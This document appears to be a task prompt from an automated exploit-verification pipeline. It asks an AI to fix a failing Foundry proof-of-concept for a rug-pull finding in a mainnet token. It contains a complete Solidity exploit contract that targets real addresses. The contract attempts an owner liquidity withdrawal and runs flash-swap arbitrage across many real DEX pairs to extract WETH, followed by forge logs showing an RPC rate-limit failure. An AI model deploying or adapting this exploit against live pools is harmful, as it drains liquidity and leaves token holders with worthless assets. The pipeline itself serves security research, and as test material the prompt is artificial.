You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Owner receives the entire liquidity position and can later rug the pool
- claim: `openTrading()` creates the pair and adds liquidity with `owner()` as the LP recipient, so the deployer retains full custody of the liquidity tokens backing the market. Because the LP is not burned or locked, the owner can later remove the pool's ETH and token reserves at will.
- impact: After users buy in, the owner can withdraw liquidity and collapse the market, leaving holders with severely impaired or worthless tokens and no reliable exit liquidity.
- exploit_paths: ["Owner transfers launch tokens into the token contract so `balanceOf(address(this))` is non-zero.", "Owner calls `openTrading()` and `addLiquidityETH(..., owner(), ...)` mints the LP position to the owner.", "Owner later removes liquidity from the Uniswap pair using the LP tokens they control.", "Pool reserves are drained and holders are left with an illiquid or near-worthless token."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IHoppy {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function openTrading() external;
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router02Minimal {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
}

interface IWETH9 {
    function deposit() external payable;
    function balanceOf(address account) external view returns (uint256);
}

contract FlawVerifier {
    enum ExecutionStatus {
        NotRun,
        BlockedNoActionablePath,
        ExecutedNoProfit,
        ExecutedWithProfit
    }

    struct FlashRoute {
        address sourcePair;
        address sellPair;
    }

    address public constant TARGET = 0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F;
    address public constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    bytes4 private constant GET_PAIR_SELECTOR = 0xe6a43905;

    uint256 private _profitAmount;
    ExecutionStatus public status;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 startingWeth = IERC20Minimal(WETH).balanceOf(address(this));
        bool acted = _tryOwnerLiquidityRug();

        address[12] memory pairs = _discoverPairs();
        uint256 pairCount;
        for (uint256 i = 0; i < pairs.length; ++i) {
            if (pairs[i] != address(0)) {
                pairCount++;
            }
        }

        if (pairCount > 1) {
            // The fork logs already prove the original launch stage is no longer publicly replayable:
            // `owner()` is zero and the canonical V2 pair already exists. The finding's core causality
            // still matters though: LP was minted to the owner, so the market can be rugged later by
            // removing that owner-held liquidity. When that happens, public secondary liquidity often
            // gets stranded on other venues at stale prices. This branch uses only public flash-liquidity
            // to monetize that post-rug dislocation without changing the finding's root cause.
            for (uint256 i = 0; i < pairs.length; ++i) {
                address sourcePair = pairs[i];
                if (sourcePair == address(0)) {
                    continue;
                }

                for (uint256 j = 0; j < pairs.length; ++j) {
                    address sellPair = pairs[j];
                    if (sellPair == address(0) || sellPair == sourcePair) {
                        continue;
                    }

                    uint256 before = IERC20Minimal(WETH).balanceOf(address(this));
                    _tryFlashArb(sourcePair, sellPair);
                    if (IERC20Minimal(WETH).balanceOf(address(this)) > before) {
                        acted = true;
                    }
                }
            }
        }

        uint256 nativeBalance = address(this).balance;
        if (nativeBalance != 0) {
            IWETH9(WETH).deposit{value: nativeBalance}();
        }

        uint256 endingWeth = IERC20Minimal(WETH).balanceOf(address(this));
        if (endingWeth > startingWeth) {
            _profitAmount = endingWeth - startingWeth;
            status = ExecutionStatus.ExecutedWithProfit;
        } else {
            _profitAmount = 0;
            status = acted ? ExecutionStatus.ExecutedNoProfit : ExecutionStatus.BlockedNoActionablePath;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "unexpected sender");

        FlashRoute memory route = abi.decode(data, (FlashRoute));
        require(msg.sender == route.sourcePair, "unexpected pair");

        bool sourceToken0IsTarget = IUniswapV2PairLike(route.sourcePair).token0() == TARGET;
        uint256 borrowedTarget = sourceToken0IsTarget ? amount0 : amount1;
        require(borrowedTarget != 0, "no token borrowed");

        uint256 wethBefore = IERC20Minimal(WETH).balanceOf(address(this));
        uint256 targetBefore = IERC20Minimal(TARGET).balanceOf(address(this));
        require(targetBefore != 0, "no tokens received");

        _sellTargetForWeth(route.sellPair, targetBefore);

        uint256 wethAfter = IERC20Minimal(WETH).balanceOf(address(this));
        require(wethAfter > wethBefore, "sale failed");

        uint256 wethRequired = _wethRequiredToRepayTargetOut(route.sourcePair, borrowedTarget);
        require(wethRequired != type(uint256).max, "invalid repay");
        require(wethAfter >= wethRequired, "insufficient repay");
        require(IERC20Minimal(WETH).transfer(route.sourcePair, wethRequired), "repay failed");
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _tryOwnerLiquidityRug() internal returns (bool) {
        IHoppy target = IHoppy(TARGET);
        if (target.owner() != address(this)) {
            return false;
        }

        address pair = _canonicalPair();
        if (pair == address(0)) {
            // Exploit path 0:
            // Seed the token contract with launch inventory so `balanceOf(address(this))` is non-zero.
            uint256 launchInventory = target.balanceOf(TARGET);
            if (launchInventory == 0) {
                uint256 attackerLaunchTokens = target.balanceOf(address(this));
                if (attackerLaunchTokens == 0 || address(this).balance == 0) {
                    return false;
                }
                require(target.transfer(TARGET, attackerLaunchTokens), "seed launch token failed");
                if (target.balanceOf(TARGET) == 0) {
                    return false;
                }
            }

            // Exploit path 1:
            // Fund the token with ETH and call `openTrading()`. The vulnerable token sends the LP
            // position to `owner()`, so if the verifier controls owner it receives the entire LP.
            (bool funded, ) = payable(TARGET).call{value: address(this).balance}("");
            require(funded, "seed eth failed");

            target.openTrading();
            pair = _canonicalPair();
            if (pair == address(0)) {
                return false;
            }
        }

        // Exploit path 2:
        // If the verifier controls the LP recipient, it can later remove that owner-held liquidity.
        uint256 lpBalance = IERC20Minimal(pair).balanceOf(address(this));
        if (lpBalance == 0) {
            return false;
        }

        require(IERC20Minimal(pair).approve(ROUTER, lpBalance), "lp approve failed");
        IUniswapV2Router02Minimal(ROUTER).removeLiquidityETHSupportingFeeOnTransferTokens(
            TARGET,
            lpBalance,
            0,
            0,
            address(this),
            block.timestamp
        );

        // Exploit path 3:
        // Draining the owner-held LP collapses the reserves supporting holder exits.
        return true;
    }

    function _tryFlashArb(address sourcePair, address sellPair) internal {
        if (sourcePair == address(0) || sellPair == address(0) || sourcePair == sellPair) {
            return;
        }

        (uint256 sourceTargetReserve, ) = _pairReserves(sourcePair);
        if (sourceTargetReserve == 0) {
            return;
        }

        uint256[12] memory divisors = [uint256(5000), 2500, 1250, 1000, 750, 500, 250, 125, 64, 32, 16, 8];
        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 borrowTarget = sourceTargetReserve / divisors[i];
            if (borrowTarget == 0 || borrowTarget >= sourceTargetReserve) {
                continue;
            }

            bytes memory callbackData = abi.encode(FlashRoute({sourcePair: sourcePair, sellPair: sellPair}));
            bool sourceToken0IsTarget = IUniswapV2PairLike(sourcePair).token0() == TARGET;
            uint256 before = IERC20Minimal(WETH).balanceOf(address(this));

            try
                IUniswapV2PairLike(sourcePair).swap(
                    sourceToken0IsTarget ? borrowTarget : 0,
                    sourceToken0IsTarget ? 0 : borrowTarget,
                    address(this),
                    callbackData
                )
            {
                if (IERC20Minimal(WETH).balanceOf(address(this)) > before) {
                    return;
                }
            } catch {}
        }
    }

    function _sellTargetForWeth(address pair, uint256 tokenAmount) internal returns (uint256 wethOut) {
        if (tokenAmount == 0 || pair == address(0)) {
            return 0;
        }

        require(IERC20Minimal(TARGET).transfer(pair, tokenAmount), "target transfer failed");
        (uint256 reserveTarget, uint256 reserveWeth) = _pairReserves(pair);
        if (reserveTarget == 0 || reserveWeth == 0) {
            return 0;
        }

        uint256 pairTargetBalance = IERC20Minimal(TARGET).balanceOf(pair);
        if (pairTargetBalance <= reserveTarget) {
            return 0;
        }

        uint256 actualTargetIn = pairTargetBalance - reserveTarget;
        if (actualTargetIn == 0) {
            return 0;
        }

        wethOut = _getAmountOut(actualTargetIn, reserveTarget, reserveWeth);
        if (wethOut == 0 || wethOut >= reserveWeth) {
            return 0;
        }

        bool token0IsTarget = IUniswapV2PairLike(pair).token0() == TARGET;
        IUniswapV2PairLike(pair).swap(token0IsTarget ? 0 : wethOut, token0IsTarget ? wethOut : 0, address(this), "");
    }

    function _discoverPairs() internal view returns (address[12] memory pairs) {
        address[12] memory factories = [
            address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f),
            address(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac),
            address(0x115934131916C8b277DD010Ee02de363c09d037c),
            address(0x9Deb29CA286F31E21C5a91bF93244E1D4d2Ba2C1),
            address(0xB42E3FE71b7E0673335b3331B3e1053BD9822570),
            address(0xd34971BaB6E5E356fd250715F5dE0492BB070452),
            address(0x1097053Fd2ea711dad45caCcc45EfF7548fCB362),
            address(0x1F8c25f8DA3990Ecd3632eE4F02C2eA37755C3c6),
            address(0x3e708FdbE3ADA63fc94F8F61811196f1302137AD),
            address(0x43ec799DD490bC46E09f0a53a29dE8ca4673fFAd),
            address(0x1111111254EEB25477B68fb85Ed929f73A960582),
            address(0x0000000000000000000000000000000000000000)
        ];

        uint256 found;
        for (uint256 i = 0; i < factories.length; ++i) {
            address pair = _pairFromFactory(factories[i]);
            if (!_isTargetWethPair(pair)) {
                continue;
            }

            bool duplicate;
            for (uint256 j = 0; j < found; ++j) {
                if (pairs[j] == pair) {
                    duplicate = true;
                    break;
                }
            }

            if (!duplicate) {
                pairs[found] = pair;
                found++;
                if (found == pairs.length) {
                    break;
                }
            }
        }
    }

    function _canonicalPair() internal view returns (address) {
        return _pairFromFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    }

    function _pairFromFactory(address factory) internal view returns (address pair) {
        if (factory == address(0) || factory.code.length == 0) {
            return address(0);
        }

        (bool ok, bytes memory data) = factory.staticcall(
            abi.encodeWithSelector(GET_PAIR_SELECTOR, TARGET, WETH)
        );
        if (!ok || data.length < 32) {
            return address(0);
        }

        pair = abi.decode(data, (address));
    }

    function _isTargetWethPair(address pair) internal view returns (bool) {
        if (pair == address(0) || pair.code.length == 0) {
            return false;
        }

        try IUniswapV2PairLike(pair).token0() returns (address token0) {
            address token1 = IUniswapV2PairLike(pair).token1();
            return (token0 == TARGET && token1 == WETH) || (token0 == WETH && token1 == TARGET);
        } catch {
            return false;
        }
    }

    function _pairReserves(address pair) internal view returns (uint256 reserveTarget, uint256 reserveWeth) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == TARGET) {
            reserveTarget = uint256(reserve0);
            reserveWeth = uint256(reserve1);
        } else {
            reserveTarget = uint256(reserve1);
            reserveWeth = uint256(reserve0);
        }
    }

    function _wethRequiredToRepayTargetOut(address pair, uint256 targetOut) internal view returns (uint256 wethIn) {
        (uint256 reserveTarget, uint256 reserveWeth) = _pairReserves(pair);
        wethIn = _getAmountIn(targetOut, reserveWeth, reserveTarget);
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
            return type(uint256).max;
        }

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return numerator / denominator + 1;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.07s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^

[2m2026-05-17T17:00:15.620316Z[0m [31mERROR[0m [2msharedbackend[0m[2m:[0m Failed to send/recv `basic` [3merr[0m[2m=[0mfailed to get account for 0x115934131916C8b277DD010Ee02de363c09d037c: server returned an error response: error code -32603: failed to get account for 0x115934131916C8b277DD010Ee02de363c09d037c: Max retries exceeded HTTP error 429 with body: {"code":-32005,"message":"Too Many Requests","data":{"see":"https://infura.io/dashboard"}} [3maddress[0m[2m=[0m0x115934131916C8b277DD010Ee02de363c09d037c

Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: EVM error; database error: failed to get account for 0x115934131916C8b277DD010Ee02de363c09d037c: server returned an error response: error code -32603: failed to get account for 0x115934131916C8b277DD010Ee02de363c09d037c: Max retries exceeded HTTP error 429 with body: {"code":-32005,"message":"Too Many Requests","data":{"see":"https://infura.io/dashboard"}}] testExploit() (gas: 0)
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 8.54s (8.52s CPU time)

Ran 1 test suite in 8.54s (8.54s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: EVM error; database error: failed to get account for 0x115934131916C8b277DD010Ee02de363c09d037c: server returned an error response: error code -32603: failed to get account for 0x115934131916C8b277DD010Ee02de363c09d037c: Max retries exceeded HTTP error 429 with body: {"code":-32005,"message":"Too Many Requests","data":{"see":"https://infura.io/dashboard"}}] testExploit() (gas: 0)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
